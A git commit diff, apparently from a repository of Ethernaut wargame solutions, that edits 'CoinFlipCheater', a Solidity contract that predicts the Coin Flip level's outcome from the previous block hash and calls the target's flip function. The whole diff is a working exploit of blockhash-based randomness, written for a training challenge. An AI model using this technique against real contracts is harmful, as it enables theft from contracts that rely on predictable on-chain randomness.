ff6bdb29e29cebc7c54a18efd46d29b1421ab855
NotSurprised <roro8016489@gmail.com>
2019-01-03 00:48:19 +0800

    20190103

--- 03.Coin Flip/Coin Flip.sol
+++ 03.Coin Flip/Coin Flip.sol
@@ -6,14 +6,13 @@ contract CoinFlip {
 }
 
 contract CoinFlipCheater{
-    address instance_address = /*ur_instance_address_here*/;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    function hack() public{
+    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
         uint256 blockValue = uint256(block.blockhash(block.number-1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = (coinFlip==1);
-        CoinFlip target = CoinFlip(instance_address);
+        CoinFlip target = CoinFlip(param);
         target.flip(side);
     }
 }
